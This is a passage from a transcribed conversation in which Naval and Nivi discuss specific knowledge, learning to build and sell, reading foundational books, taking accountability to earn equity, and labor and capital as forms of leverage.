and break it down and that is a specific skill that I have. I also just love tinkering with technology. And all of this stuff feels like play to me, but it looks like work to others. So, there are other people to whom these things would be hard and they say like, \u201cWell, how do I get good at being pithy and selling ideas?\u201d Well, if you\u2019re not already good at it or if you\u2019re not really into it, maybe it\u2019s not your thing, focus on the thing that you are really into. This is ironic, but the first person to actually point out my real specific knowledge was my mother. She did it as an aside, talking from the kitchen and she said it when I was like 15 or 16 years old. I was telling a friend of mine that I want to be an astrophysicist and she said, \u201cNo, you\u2019re going to go into business.\u201d I was like, \u201cWhat, my mom\u2019s telling me I\u2019m going to be in business. I\u2019m going to be an astrophysicist. Mom doesn\u2019t know she\u2019s talking about.\u201d But mom knew exactly what she was talking about. She\u2019d already observed that every time we walk down the street, I would critique the local pizza parlor on why they were selling their slices a certain way with certain toppings and why their process of ordering was this way when it should have been that way. So, she knew that I had more of a business curious mind, but then my obsession with science combined to create technology and technology businesses where I found myself. So, very often, your specific knowledge is observed and often observed by other people who know you well and revealed in situations rather than something that you come up with. Specific Knowledge Is Highly Creative or Technical Specific knowledge is on the bleeding edge of technology, art and communication Specific knowledge can be taught through apprenticeships Naval: To the extent that specific knowledge is taught, it\u2019s on the job. It\u2019s through apprenticeships. And that\u2019s why the best businesses, the best careers are the apprenticeship or self-taught careers, because those are things society still has not figured out how to train and automate yet. The classic line here is that Warren Buffett went to Benjamin Graham when he got out of school. Benjamin Graham was the author of the Intelligent Investor and sort of modernized or created value investing as a discipline. And Warren Buffett went to Benjamin Graham and offered to work for him for free. And Graham said, \u201cActually, you\u2019re overpriced, free is overpriced.\u201d And Graham was absolutely right. When it comes to a very valuable apprenticeship like the type that Graham was going to give Buffet, Buffet should have been paying him a lot of money. That right there tells you that those are skills worth having. Specific knowledge is often highly creative or technical Specific knowledge also tends to be technical and creative. It\u2019s on the bleeding edge of technology, on the bleeding edge of art, on the bleeding edge of communication. Even today, for example, there are probably meme lords out there on the Internet who can create incredible memes that will spread the idea to millions of people. Or are very persuasive \u2013 Scott Adams is a good example of this. He is essentially becoming one of the most credible people in the world by making accurate predictions through persuasive arguments and videos. And that is specific knowledge that he has built up over the years because he got obsessed with hypnosis when he was young, he learned how to communicate through cartooning, he embraced Periscope early, so he\u2019s been practicing lots of conversation, he\u2019s read all the books on the topic, he\u2019s employed it in his everyday life. If you look at his girlfriend, she\u2019s this beautiful young Instagram model. That is an example of someone who has built up a specific knowledge over the course of his career. It\u2019s highly creative, it has elements of being technical in it, and it\u2019s something that is never going to be automated. No one\u2019s going to take that away from him, because he\u2019s also accountable under one brand as Scott Adams, and he\u2019s operating with the leverage of media with Periscope and drawing Dilbert cartoons and writing books. He has massive leverage on top of that brand and he can build wealth out of it if he wanted to build additional wealth beyond what he already has. Specific knowledge is specific to the individual and situation Nivi: Should we be calling it unique knowledge or does specific knowledge somehow make more sense for it? Naval: You know, I came up with this framework when I was really young. We\u2019re talking decades and decades. It\u2019s now probably over 30 years old. So, at the time specific knowledge stuck with me so that is how I think about it. The reason I didn\u2019t try and change it is because every other term that I found for it was overloaded in a different way. At least specific knowledge isn\u2019t that used. I can kind of rebrand it. The problem with unique knowledge is, yeah, maybe it\u2019s unique but if I learn it from somebody else it\u2019s no longer unique, then we both know it. So, it\u2019s not so much that it is unique, it\u2019s that it is highly specific to the situation, it\u2019s specific to the individual, it\u2019s specific to the problem, and it can only be built as part of a larger obsession, interest, and time spent in that domain. It can\u2019t just be read straight out of a single book, nor can it be taught in a single course, nor can it be programmed into a single algorithm. You can\u2019t be too deliberate about assembling specific knowledge Nivi: Speaking of Scott Adams, he\u2019s got a blog post on how to build your career by getting in, say, the top 25 percentile at three or more things. And by doing that, you become the only person in the world who can do those three things in the 25th percentile. So, instead of trying to be the best at one thing, you just try to be very, very good at three or more things. Is that a way of building specific knowledge? Naval: I actually think the best way is just to follow your own obsession. And somewhere in the back of your mind, you can realize that, actually, this obsession I like and I\u2019ll keep an eye out for the commercial aspects of it. But I think if you go around trying to build it a little too deliberately, if you become too goal-oriented on the money, then you won\u2019t pick the right thing. You won\u2019t actually pick the thing that you love to do, so you won\u2019t go deep enough into it. Scott Adams\u2019 observation is a good one, predicated on statistics. Let\u2019s say there\u2019s 10,000 areas that are valuable to the human race today in terms of knowledge to have, and the number one in those 10,000 slots is taken. Someone else is likely to be the number one in each of those 10,000, unless you happen to be one of the 10,000 most obsessed people in the world that at a given thing. But when you start combining, well, number 3,728 with top-notch sales skills and really good writing skills and someone who understands accounting and finance really well, when the need for that intersection arrives, you\u2019ve expanded enough from 10,000 through combinatorics to millions or tens of millions. So, it just becomes much less competitive. Also, there\u2019s diminishing returns. So, it\u2019s much easier to be top 5 percentile at three or four things than it is to be literally the number one at something. Build specific knowledge where you are a natural I think it\u2019s a very pragmatic approach. But I think it\u2019s important that one not start assembling things too deliberately because you do want to pick things where you are a natural. Everyone is a natural at something. We\u2019re all familiar with that phrase, a natural. \u201cOh, this person is a natural at meeting men or women, this person is a natural socialite, this person is a natural programmer, this person is a natural reader.\u201d So, whatever you are a natural at, you want to double down on that. And then there are probably multiple things you\u2019re natural at because personalities and humans are very complex. So, we want to be able to take the things that you are natural at and combine them so that you automatically, just through sheer interest and enjoyment, end up top 25% or top 10% or top 5% at a number of things. Learn to Sell, Learn to Build If you can do both, you will be unstoppable Learn to sell, learn to build Nivi: Talking about combining skills, you said that you should \u201clearn to sell, learn to build, if you can do both, you will be unstoppable.\u201d Naval: This is a very broad category. It\u2019s two broad categories. One is building the product. Which is hard, and it\u2019s multivariate. It can include design, it can include development, it can include manufacturing, logistics, procurement, it can even be designing and operating a service. It has many, many definitions. But in every industry, there is a definition of the builder. In our tech industry it\u2019s the CTO, it\u2019s the programmer, it\u2019s the software engineer, hardware engineer. But even in the laundry business, it could be the person who\u2019s building the laundry service, who is making the trains run on time, who\u2019s making sure all the clothes end up in the right place at the right time, and so on. The other side of it is sales. Again, selling has a very broad definition. Selling doesn\u2019t necessarily just mean selling individual customers, but it can mean marketing, it can mean communicating, it can mean recruiting, it can mean raising money, it can mean inspiring people, it could mean doing PR. It\u2019s a broad umbrella category. The Silicon Valley model is a builder and seller So, generally, the Silicon Valley startup model tends to work best. It\u2019s not the only way, but it is probably the most common way, when you have two founders, one of whom is world class at selling, and one of whom is world class at building. Examples are, of course, Steve Jobs and Steve Wozniak with Apple, Gates and Allen probably had similar responsibilities early on with Microsoft, Larry and Sergey probably broke down along those lines, although it\u2019s a little different there because that was a very technical product delivered to end users through a simple interface. But generally, you will see this pattern repeated over and over. There\u2019s a builder and there\u2019s a seller. There\u2019s a CEO and CTO combo. And venture and technology investors are almost trained to look for this combo whenever possible. It\u2019s the magic combination. If you can do both you will be unstoppable The ultimate is when one individual can do both. That\u2019s when you get true superpowers. That\u2019s when you get people who can create entire industries. The living example is Elon Musk. He may not necessarily be building the rockets himself, but he understands enough that he actually makes technical contributions. He understands the technology well enough that no one\u2019s going to snow him on it, and he\u2019s not running around making claims that he doesn\u2019t think he can\u2019t eventually deliver. He may be optimistic on the timelines but he thinks this is within reasonableness for delivery. Even Steve Jobs developed enough product skills and was involved enough in the product that he also operated in both of these domains. Larry Ellison started as a programmer and I think wrote the first version of Oracle, or was actually heavily involved in it. Marc Andreessen was also in this domain. He may not have had enough confidence in his sales skills, but he was the programmer who wrote Netscape Navigator, or a big chunk of it. So, I think the real giants in any field are the people who can both build and sell. I\u2019d rather teach an engineer marketing than a marketer engineering And usually the building is a thing that a sales person can\u2019t pick up later in life. It requires too much focused time. But a builder can pick up selling a little bit later, especially if they were already innately wired to be a good communicator. Bill Gates famously paraphrases this as, \u201cI\u2019d rather teach an engineer marketing, than a marketer engineering.\u201d I think if you start out with a building mentality and you have building skills and it\u2019s still early enough in your life, or you have enough focused time that you think you can learn selling, and you have some natural characteristics or you\u2019re a good salesperson, then you can double down on those. Now, your sales skills could be in a different than traditional domain. For example, let\u2019s say you\u2019re a really good engineer and then people are saying, well, now you need to be good at sales, well, you may not be good at hand-to-hand sales, but you may be a really good writer. And writing is a skill that can be learned much more easily than, say, in-person selling, and so you may just cultivate writing skills until you become a good online communicator and then use that for your sales. On the other hand, it could just be that you\u2019re a good builder and you\u2019re bad at writing and you don\u2019t like communicating to mass audiences but you\u2019re good one-on-one, so then you might use your sales skills for recruiting or for fundraising, which are more one-on-one kinds of endeavors. This is pointing out that if you\u2019re at the intersection of these two, don\u2019t despair because you\u2019re not going to be the best technologist and you\u2019re not going to be the best salesperson, but in a weird way, that combination, back to the Scott Adams skill stack, that combination of two skills is unstoppable. Long term, people who understand the underlying product and how to build it and can sell it, these are catnip to investors, these people can break down walls if they have enough energy, and they can get almost anything done. Nivi: If you could only pick one to be good at, which one would you pick? Naval: When you\u2019re trying to stand out from the noise building is actually better because there\u2019re so many hustlers and sales people who have nothing to back them up. When you\u2019re starting out, when you\u2019re trying to be recognized, building is better. But much later down the line building gets exhausting because it is a focus job and it\u2019s hard to stay current because there\u2019s always new people, new products coming up who have newer tools, and frankly more time because it\u2019s very intense, it\u2019s a very focused task. So, sales skills actually scale better over time. Like for example, if you have a reputation for building a great product, that\u2019s good, but when you ship your new product, I\u2019m going to validate it based on the product. But if you have a reputation for being a good person to do business with and you\u2019re persuasive and communicative then that reputation almost becomes self-fulfilling. So, I think if you only had to pick up one, you can start with building and then transition to selling. This is a cop-out answer, but I think that is actually the right answer. Read What You Love Until You Love to Read You should be able to pick up any book in the library and read it Read what you love until you love to read Nivi: Before we go and talk about accountability and leverage and judgment, you\u2019ve got a few tweets further down the line that I would put in the category of continuous learning. They\u2019re essentially, \u201cthere is no skill called business. Avoid business magazines and business class, study microeconomics, game theory, psychology, persuasion, ethics, mathematics and computers.\u201d There\u2019s one other comment that you made in a Periscope that was, \u201cyou should be able to pick up any book in the library and read it.\u201d And the last tweet in this category was, \u201creading is faster than listening, doing is faster than watching.\u201d Naval: Yeah, the most important tweet on this, I don\u2019t even have in here unfortunately, which is, the foundation of learning is reading. I don\u2019t know a smart person who doesn\u2019t read and read all the time. And the problem is, what do I read? How do I read? Because for most people it\u2019s a struggle, it\u2019s a chore. So, the most important thing is just to learn how to educate yourself and the way to educate yourself is to develop a love for reading. So, the tweet that is left out, the one that I was hinting at is, \u201cread what you love until you love to read.\u201d It\u2019s that simple. Everybody I know who reads a lot loves to read, and they love to read because they read books that they loved. It\u2019s a little bit of a catch-22, but you basically want to start off just reading wherever you are and then keep building up from there until reading becomes a habit. And then eventually, you will just get bored of the simple stuff. So you may start off reading fiction, then you might graduate to science fiction, then you may graduate to non-fiction, then you may graduate to science, or philosophy, or mathematics or whatever it is, but take your natural path and just read the things that interest you until you kind of understand them. And then you\u2019ll naturally move to the next thing and the next thing and the next thing. Read the original scientific books in a field Now, there is an exception to this, which is where I was hinting with what things you actually do want to learn, which is, at some point there\u2019s too much out there to read. Even reading is full of junk. There are actually things you can read, especially early on, that will program your brain a certain way, and then later things that you read, you will decide whether those things are true or false based on the earlier things. So, it is important that you read foundational things. And foundational things, I would say, are the original books in a given field that are very scientific in their nature. For example, instead of reading a business book, pick up Adam Smith\u2019s The Wealth of Nations. Instead of reading a book on biology or evolution that\u2019s written today, I would pick up Darwin\u2019s Origin of the Species. Instead of reading a book on biotech right now that may be very advanced, I would just pick up The Eighth Day of Creation by Watson and Crick. Instead of reading advanced books on what cosmology and what Neil Degrasse Tyson and Stephen Hawking have been saying, you can pick up Richard Feynman\u2019s Six Easy Pieces and start with basic physics. Don\u2019t fear any book If you understand the basics, especially in mathematics and physics and sciences, then you will not be afraid of any book. All of us have that memory of when we were sitting in class and we\u2019re learning mathematics, and it was all logical and all made sense until at one point the class moved too fast and we fell behind. Then after that we were left memorizing equations, memorizing concepts without being able to derive them from first principles. And at that moment, we\u2019re lost, because unless you\u2019re a professional mathematician, you\u2019re not going to remember those things. All you\u2019re going to remember are the techniques, the foundations. So, you have to make sure that you\u2019re building on a steel frame of understanding because you\u2019re putting together a foundation for skyscraper, and you\u2019re not just memorizing things because you\u2019re just memorizing things you\u2019re lost. So the foundations are ultra important. And the ultimate, the ultimate is when you walk into a library and you look at it up and down and you don\u2019t fear any book. You know that you can take any book off the shelf, you can read it, you can understand it, you can absorb what is true, you can reject what is false, and you have a basis for even working that out that is logical and scientific and not purely just based on opinions. The means of learning are abundant; the desire to learn is scarce The beauty of the internet is the entire library of Alexandria times 10 is at your fingertips at all times. It\u2019s not the means of education or the means of learning are scarce, the means of learning are abundant. It\u2019s the desire to learn that\u2019s scarce. So, you really have to cultivate the desire. And it\u2019s not even cultivating you\u2019ve to not lose it. Children have a natural curiosity. If you go to a young child who\u2019s first learning language, they\u2019re pretty much always asking: What\u2019s this? What\u2019s that? Why is this? Who\u2019s that? They\u2019re always asking questions. But one of the problems is that schools and our educational system, and even our way of raising children replaces curiosity with compliance. And once you replace the curiosity with the compliance, you get an obedient factory worker, but you no longer get a creative thinker. And you need creativity, you need the ability to feed your own brain to learn whatever you want. The Foundations Are Math and Logic Mathematics and logic are the basis for understanding everything else The ultimate foundations are math and logic Naval: Foundational things are principles, they\u2019re algorithms, they\u2019re deep seated logical understanding where you can defend it or attack it from any angle. And that\u2019s why microeconomics is important because macroeconomics is a lot of memorization, a lot of macro bullshit. As Nassim Taleb says, it is easier to macro bullshit than it is the micro bullshit. Because macroeconomics is voodoo-complex-science meets politics. You can\u2019t find two macroeconomists to agree on anything these days, and different macroeconomists get used by different politicians to peddle their different pet theories. There are even macroeconomists out there now peddling something called Modern Monetary Theory which basically says, hey, except for this pesky thing called inflation, we can just print all the money that we want. Yes, except for this pesky thing called inflation. That\u2019s like saying, except for limited energy, we can fire rockets off into space all day long. It\u2019s just nonsense, but the fact that there are people who have \u201cmacroeconomist\u201d in their title and are peddling Modern Monetary Theory just tells you that macroeconomics as a so-called science has been corrupted. It\u2019s now a branch of politics. So, you really want to focus on the foundations. The ultimate foundation are mathematics and logic. If you understand logic and mathematics, then you have the basis for understanding the scientific method. Once you understand the scientific method, then you can understand how to separate truth from falsehood in other fields and other things that you\u2019re reading. It\u2019s better to read a great book slowly than to fly through a hundred books quickly So, be very careful about reading other people\u2019s opinions and even be careful when reading facts because so-called facts are often just opinions with a veneer [of pseudoscience] around them. What you are really looking for are algorithms. What you are really looking for is understanding. It\u2019s better to go through a book really slowly and struggle and stumble and rewind, than it is to fly through it quickly and say, \u201cWell, now I\u2019ve read 20 books, I\u2019ve read 30 books, I\u2019ve read 50 books in the field.\u201d It\u2019s like Bruce Lee said, \u201cI don\u2019t fear the man who knows a thousand kicks and a thousand punches, I fear the man who\u2019s practiced one punch ten thousand times or one kick ten thousand times.\u201d It\u2019s that understanding that comes through repetition and through usage and through logic and foundations that really makes you a smart thinker. Learn persuasion and programming Nivi: To lay a foundation for learning for the rest of your life I think you need two things, if I was going to try and sum it up. One, practical persuasion and two, you need to go deep in some technical category, whether it\u2019s abstract math, or you want to read Donald Knuth\u2019s books on algorithms, or you want to read Feynman\u2019s lectures on physics. If you have practical persuasion and a deep understanding of some complex topic, I think you\u2019ll have a great foundation for learning for the rest of your life. Naval: Yeah. In fact let me expand that a little bit. I would say that the five most important skills are of course, reading, writing, arithmetic, and then as you\u2019re adding in, persuasion, which is talking. And then finally, I would add computer programming just because it\u2019s an applied form of arithmetic that just gets you so much leverage for free in any domain that you operate in. If you\u2019re good with computers, if you\u2019re good at basic mathematics, if you\u2019re good at writing, if you\u2019re good at speaking, and if you like reading, you\u2019re set for life. There\u2019s No Actual Skill Called \u2018Business\u2019 Avoid business schools and magazines There\u2019s no actual skill called \u2018business\u2019 Naval: In that sense, business to me is bottom of the barrel. There\u2019s no actual skill called business, it\u2019s too generic. It\u2019s like a skill called \u201crelating.\u201d Like \u201crelating to humans.\u201d That\u2019s not a skill, it\u2019s too broad. A lot of what goes on in business schools, and there is some very intelligent stuff taught in business schools \u2013 I don\u2019t mean to detract from them completely \u2013 some of the things taught in business school are just anecdotes. They call them \u201ccase studies.\u201d But they\u2019re just anecdotes, and they\u2019re trying to help you pattern match by throwing lots of data points at you, but the reality is, you will never understand them fully until you\u2019re actually in that position yourself. Even then you will find that basic concepts from game theory, psychology, ethics, mathematics, computers, and logic will serve you much, much better. I would focus on the foundations, I would focus with a science bent. I would develop a love for reading, including by reading so-called junk food that you\u2019re not supposed to read. You don\u2019t have to read the classics. That [reading] is the foundation for your self-education. Doing is faster than watching Nivi: What did you mean when you said that \u201cdoing is faster than watching?\u201d Naval: When it comes to your learning curve, if you want to optimize your learning curve\u2026 One of the reasons why I don\u2019t love podcasts, even though I\u2019m a generator of podcasts, is that I like to consume my information very quickly. And I\u2019m a good reader, or a fast reader and I can read very fast but I can only listen at a certain speed. I know people listen at 2x, 3x, but everyone sounds like a chipmunk and it\u2019s hard to go back, it\u2019s hard to highlight, it\u2019s hard to pinpoint snippets and save them in your notebook, and so on. Similarly, a lot of people think they can become really skilled at something by watching others do it, or even by reading about others doing it. And going back to the business school case study, that\u2019s a classic example. They study other people\u2019s businesses, but in reality, you\u2019re going to learn a lot more about running a business by operating your own lemonade stand or equivalent. Or even opening a little retail store down the street. That is how you\u2019re going to learn on the job because a lot of the subtleties don\u2019t express themselves until you\u2019re actually in the business. For example, everyone\u2019s into mental models these days. You go to Farnam Street, you go to Poor Charlie\u2019s Almanack, and you can learn all the different mental models. But which ones matter more? Which ones do you apply more often? Which ones matter in which circumstances? That\u2019s actually the hard part. For example, my personal learning has been that the principal-agent problem drives so much in this world. It\u2019s an incentives problem. I\u2019ve learned that tit-for-tat iterated prisoner\u2019s dilemma is the piece of game theory that is worth knowing the most. You can almost put down the game theory book after that. By the way, the best way to learn game theory is to play lots of games. I never even read game theory books. I consider myself extremely good at game theory. I\u2019ve never opened up a game theory book and found a result in there where I didn\u2019t think, \u201cOh, yeah, that\u2019s common sense to me.\u201d The reason is that I grew up playing all kinds of games and I ran into all kinds of corner cases with all kinds of friends, and so it\u2019s just second nature to me. You can always learn better by doing it on the job. The number of \u2018doing\u2019 iterations drives the learning curve But doing is a subtle thing. Doing encapsulates a lot. For example, let\u2019s say, I want to learn how to run a business. Well, if I start a business where I go in every day and I\u2019m doing the same thing, let\u2019s say I\u2019m running a retail store down the street where I\u2019m stocking the shelves with food and liquor every single day, I\u2019m not going to learn that much because I\u2019m repeating things a lot. So, I\u2019m putting in thousands of hours, but they are thousands of hours doing the same thing. Whereas if I was putting in thousands of iterations, that would be different. So, the learning curve is across iterations [not iterations]. So if I was trying new marketing experiments in the store all the time, I was constantly changing up the inventory, I was constantly changing up the branding and the messaging, I was constantly changing the sign, I was constantly changing the online channels that are used to drive foot traffic in, I was experimenting with being open at different hours, I had the ability to walk around and talk to other store owners and getting their books and figure out how they run their businesses. It\u2019s the number of iterations that drives the learning curve. So, the more iterations you can have, the more shots on goal you can have, the faster you\u2019re going to learn. It\u2019s not just about the hours put in. If you\u2019re willing to bleed a little every day, you may win big later It\u2019s actually a combination of the two, but I think just the way we\u2019re built and the way that the world presents itself, the world offers us very easily the opportunity to do the same thing over and over and over again. But really, we\u2019d be better served if we went off and found ways to do new things from scratch. And doing something new the first time is painful, because you\u2019re wandering into uncertain territory and high odds are that you will fail. So you just have to get very, very comfortable with frequent small failures. Nassim Taleb talks about this also. He made his fortune, his wealth by being a trader who basically relied upon black swans. Nassim Taleb made money by losing little bits of money every day and then once in a blue moon he would make a lot of money when the unthinkable happened for other people. Whereas most people want to make little bits of money every day and in exchange they\u2019ll tolerate lots of blow-up risk, they\u2019ll tolerate going completely bankrupt. We\u2019re not evolved to bleed a little bit every day. If you\u2019re out in the natural environment, and you get a cut and you\u2019re literally bleeding a little bit every day, you will eventually die. You\u2019ll have to stop that cut. We\u2019re evolved for small victories all the time but that becomes very expensive. That\u2019s where the crowd is. That\u2019s where the herd is. So, if you\u2019re willing to bleed a little bit every day but in exchange you\u2019ll win big later, you will do better. That is, by the way, entrepreneurship. Entrepreneurs bleed every day. They\u2019re not making money, they\u2019re losing money, they\u2019re constantly stressed out, all the responsibility is upon them, but when they win they win big. On average they\u2019ll make more. Embrace Accountability to Get Leverage Take risks under your own name and society will reward you with leverage You need accountability to get leverage Nivi: Why don\u2019t we jump into accountability, which I thought was pretty interesting and I think you have your own unique take on it. So the first tweet on accountability was, \u201cEmbrace accountability and take business risks under your own name. Society will reward you with responsibility, equity, and leverage.\u201d Naval: Yeah. So to get rich, you\u2019re going to need leverage. Leverage comes in labor, comes in capital, or it can come through code or media. But most of these, like labor and capital, people have to give to you. For labor, somebody has to follow you. For capital, somebody has to give you money or assets to manage or machines. So to get these things, you have to build up credibility and you have to do those under your own name as much as possible, which is risky. So accountability is a double-edged thing. It allows you to take credit when things go well and to bear the brunt of the failure when things go badly. Take business risks under your own name So in that sense, people who are stamping their names on things aren\u2019t foolish. They\u2019re just confident. Maybe it turns out to be foolish in the end, but if you look at a Kanye or an Oprah or a Trump or an Elon or anyone like that, these people can get rich just off their name because their name is such powerful branding. Regardless of what you think of Trump, you have to realize that the guy was among the best in the world at just branding his name. Why would you go to Trump Casino? Used to be because Trump. Why would you go to a Trump tower? Because of Trump. When it came time to vote, I think that a lot of voters just went in and said, \u201cTrump.\u201d They recognize the name, so the name recognition paid off. Same thing with Oprah. She puts her brand on something, her name on something and it flies off the shelves, and it\u2019s like an instant validator. These people also take risks for putting their name out there. Obviously Trump is now probably hated by half or more than half of the country and by a big chunk of the world as he sticks his name out there. By putting your name out there, you become a celebrity, and fame has many, many downsides. It\u2019s better to be anonymous and rich than to be poor and famous, but even famous and rich has a lot of downsides associated with it. You\u2019re always in the public eye. A well-functioning team has clear accountability for each position Accountability is quite important, and when you\u2019re working to build a product or you\u2019re working in a team or you\u2019re working in a business, we constantly have drummed into our heads how important it is to be part of a team. Absolutely agree with that. A lot of our training socially is telling us to not stick our necks out of the crowd. There\u2019s a saying that I hear from our Australian friends that the tall poppy gets cut. Don\u2019t stick your neck out, but I would say that actually a really, really well-functioning team is small and has clear accountability for each of the different portions. You can say, \u201cOkay, this person\u2019s responsible for building the product. This person\u2019s responsible for the messaging. This person\u2019s responsible for raising money. This person\u2019s responsible for the pricing strategy and maybe the online advertising.\u201d So if somebody screws up, you know exactly who\u2019s responsible. While at the same time if something goes really well, you also know exactly who\u2019s responsible. If you have a small team and you have clearly delineated responsibilities, then you can still keep a very high level of accountability. Accountability is really important because when something succeeds or fails, if it fails, everybody points fingers at each other, and if it succeeds, everybody steps forward to take credit. We\u2019ve all had that experience when we were in school and we got a group assignment to do. There were probably a few people in there who did a lot of the work. Then there are a few people who just did a lot of grandstanding or positioning to do the work. We\u2019re all familiar with this from a childhood sense, but it\u2019s sort of uncomfortable to talk about. People who can fail in public have a lot of power Clear accountability is important. Without accountability, you don\u2019t have incentives. Without accountability, you can\u2019t build credibility. But you take risk. You take risk of failure. You take risk of humiliation. You take risk of failure under your own name. Luckily in modern society, there\u2019s no more debtors\u2019 prison and people don\u2019t go to jail or get executed for losing other people\u2019s money, but we\u2019re still socially hard wired to not fail in public under our own names. The people who have the ability to fail in public under their own names actually gain a lot of power . For example, I\u2019ll give a personal anecdote. Up until about 2013, 2014, my public persona was an entirely around startups and investing. Only around 2014, 2015 did I start talking about philosophy and psychological things and broader things. It made me a little nervous because I was doing it under my own name. There were definitely people in the industry who sent me messages through the back channel like, \u201cWhat are you doing? You\u2019re ending your career. This is stupid.\u201d I kind of just went with it. I took a risk. Same with crypto. Early on, I took a risk. But when you put your name out there, you take a risk with certain things. You also get to reap the rewards. You get the benefits. Take Accountability to Earn Equity If you have high accountability, you\u2019re less replaceable Accountability is how you\u2019re going to get equity Naval: Accountability is important because that\u2019s how you\u2019re going to get leverage. That\u2019s how you\u2019re going to get credibility. It\u2019s also how you\u2019re going to get equity. You\u2019re going to get a piece of the business. When you\u2019re negotiating with other people, ultimately if someone else is making a decision about how to compensate you, that decision will be based on how replaceable you are. If you have high accountability, that makes you less replaceable. Then they have to give you equity, which is a piece of the upside. Taking accountability is like taking equity in all your work Equity itself is a good example because equity is also a risk-based instrument. Equity means you get paid everything after all the people who need guaranteed money are paid back. If you look at the hierarchy of capital in a company, the employees get paid first. They get paid the salary first. In legal [bankruptcy] proceedings, the salaries are sacrosanct. If you\u2019re a board member and the company spends too much money and has back salaries to pay, the government can go after you personally to pay back the salaries. The employees get the most security, but in exchange for that security, they don\u2019t have as much upside. Next in line would be the debt holders who are maybe the bankers who lend money to the company for operations and they need to make their fixed coupon every month or every year, but they don\u2019t get much more upside beyond that. They might be making 5, 10, 15, 20, 25% a year, but that\u2019s what their upside is limited to. Finally there are the equity holders. These people are actually going to get most of the upside. Once the debt holders are paid off and the salaries are paid off, whatever remains goes to them. But if there isn\u2019t enough money to pay off the salaries and the debt holders, or if there\u2019s just barely enough to pay off the salary and the debt holders, which is what happens with most businesses, most of the times, the equity holders get nothing. The equity holders take on greater risk, but in exchange, they get nearly unlimited upside. You can do the same with all of your work. Essentially, taking accountability for your actions is the same as taking an equity position in all of your work. You\u2019re taking greater downside risk for greater upside. Realize that in modern society, the downside risk is not that large. Even personal bankruptcy can wipe the debts clean in good ecosystems. I\u2019m most familiar with Silicon Valley, but generally people will forgive failures as long as you were honest and made a high integrity effort. There\u2019s not really that much to fear in terms of failure, and so people should be taking on a lot more accountability than they actually are. Nivi: Is accountability actually fragile or do you really just mean that we\u2019re hardwired not to fail in public, so it just feels like it\u2019s a fragile thing? Naval: I think it could actually be fragile. An example of accountability is you\u2019re an airplane pilot. As a captain, you\u2019re taking on accountability for the entire plane. Let\u2019s say that something goes wrong with the aircraft. You can\u2019t later blame it on anyone else. You can\u2019t blame it on the steward or the stewardess. You can\u2019t blame it on the copilot. You\u2019re the captain. You\u2019re responsible for the ship. If you screw up, you crash the ship, and there are immediate consequences. In the old days, the captain was expected to go down with the ship. If the ship was sinking, then literally the last person who got to get off was the captain. I think accountability does come with real risks, but we\u2019re talking about a business context. The risk here would be that you would probably be the last one to get your capital back out. You\u2019d be the last one to get paid for your time. The time that you\u2019ve put in, the capital that you\u2019ve put into the company, these are what are at risk. Even if a business fails and your name\u2019s on it, that\u2019s not as bad as if it turns out to be an integrity issue. Bernie Madoff, for example, Madoff investments, that name is never going to be good again in the investment community. You could be Bernie Madoff\u2019s great-great-great-grandson. You are not going to go into the investment business because he ruined the family name. I think these days the accountability risk with a name happens more around integrity, rather than it does around purely economic failure. Accountability is reputational skin in the game Nivi: The big takeaway for me on accountability is that you will be rewarded directly in proportion with your accountability. I also think this is why people like Taleb rail against CEOs who get rewards without accountability. Naval: Yeah. Taleb\u2019s Skin In The Game is required reading. If you want to get anywhere in modern life and understand how modern systems work, then Skin In The Game would be near the top of my list to read. Accountability, skin in the game, these concepts go very closely hand in hand. I think of accountability as reputational skin in the game. It\u2019s putting your personal reputation on the line as skin in the game. Accountability is a simple concept. The only part of accountability that may be a little counterintuitive is that we\u2019re currently socially brainwashed to not take on accountability, not in a visible way. I think there are ways to take on accountability where every member of a team can take on accountability for their portion. That is how you get a well-functioning team while still putting credits and losses in the correct columns. Labor and Capital Are Old Leverage Everyone is fighting over labor and capital Our brains aren\u2019t evolved to comprehend new forms of leverage Nivi: Why don\u2019t we talk a little bit about leverage? The first tweet in the storm was a famous quote from Archimedes, which was, \u201cGive me a lever long enough and a place to stand and I will move the Earth.\u201d The next tweet was, \u201cFortunes require leverage. Business leverage comes from capital, people and products with no marginal costs of replication.\u201d Naval: Leverage is critical. The reason I stuck in Archimedes quote in there is\u2026 normally I don\u2019t like putting other people\u2019s quotes in my Twitter. That doesn\u2019t add any value. You can go look up those people\u2019s quotes. But this quote I had to put in there because it\u2019s just so fundamental. I read it when I was very, very young and it had a huge impression on me. We all know what leverage is when we use a seesaw or a lever. We understand how that works physically, but I think what our brains aren\u2019t really well-evolved to comprehend is how much leverage is possible in modern society and what the newest forms of leverage are. Society overvalues labor leverage The oldest form of leverage is labor, which is people working for you. Instead of me lifting rocks, I can have 10 people lift rocks. Then just by my guidance on where the rock should go, a lot more rocks get moved than I could do myself. Everybody understands this because we\u2019re evolved to understand the labor form of leverage, so what happens is society overvalues labor as a form of leverage. This is why your parents are impressed when you get a promotion and you have lots of people working underneath you. This is why when a lot of naive people, when you tell them about your company, they\u2019ll say, \u201cHow many people work there?\u201d They\u2019ll use that as a way to establish credibility. They\u2019re trying to measure how much leverage and impact you actually have. Or when someone starts a movement, they\u2019ll say how many people they have or how big the army is. We just automatically assume that more people is better. You want the minimum amount of labor that allows you to use the other forms of leverage I would argue that this is the worst form of leverage that you could possibly use. Managing other people is incredibly messy. It requires tremendous leadership skills. You\u2019re one short hop from a mutiny or getting eaten or torn apart by the mob. It\u2019s incredibly competed over. Entire civilizations have been destroyed over this fight. For example, communism, Marxism, is all about the battle between capital and labor, das kapital and das labor. It\u2019s kind of a trap. You really want to stay out of labor-based leverage. You want the minimum amount of people working with you that are going to allow you to use the other forms of leverage, which I would argue are much more interesting. Capital has been the dominant form of leverage in the last century The second type of leverage is capital. This one\u2019s a little less hardwired into us because large amounts of money moving around and being saved and being invested in money markets, these are inventions of human beings the in last few hundred to few thousand years. They\u2019re not evolved with us from hundreds of thousands of years. We understand them a little bit less well. They probably require more intelligence to use correctly, and the ways in which we use them keep changing. Management skills from a hundred years ago might still apply today, but investing in the stock market skills from a hundred years ago probably don\u2019t apply to the same level today. Capital is a trickier form of leverage to use. It\u2019s more modern. It\u2019s the one that people have used to get fabulously wealthy in the last century. It\u2019s probably been the dominant form of leverage in the last century. You can see this by who are the richest people. It\u2019s bankers, politicians in corrupt countries who print money, essentially people who move large amounts of money around. If you look at the top of very large companies, outside of technology companies, in many, many large old companies, the CEO job is really a financial job. They\u2019re really financial asset managers. Sometimes, an asset manager can put a pleasant face on it, so you get a Warren Buffet type. But deep down, I think we all dislike capital as a form of leverage because it feels unfair. 